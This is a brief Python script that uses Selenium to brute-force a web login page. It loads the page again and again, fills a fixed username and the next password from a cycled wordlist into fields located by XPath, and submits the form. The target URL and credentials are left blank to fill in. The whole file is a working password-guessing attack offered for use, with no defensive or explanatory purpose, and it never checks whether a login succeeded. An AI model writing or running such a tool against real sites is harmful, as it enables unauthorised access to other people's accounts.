from itertools import cycle
from selenium import webdriver
from selenium.webdriver.common.keys import Keys
driver = webdriver.Chrome()

url = ""#Enter the URL of the login here
username = ""#Enter the username to be tried here
wordlist = []#Enter all logins to be tried here

usernamexpath = ""
passwordxpath = ""

licycle = cycle(wordlist)

while True:
    nextelem = next(licycle)
    driver.get(url)
    inputElement = driver.find_element_by_xpath(usernamexpath)
    inputElement.send_keys(username)
    inputElement = driver.find_element_by_xpath(passwordxpath)
    inputElement.send_keys(nextelem)

    inputElement.submit() 

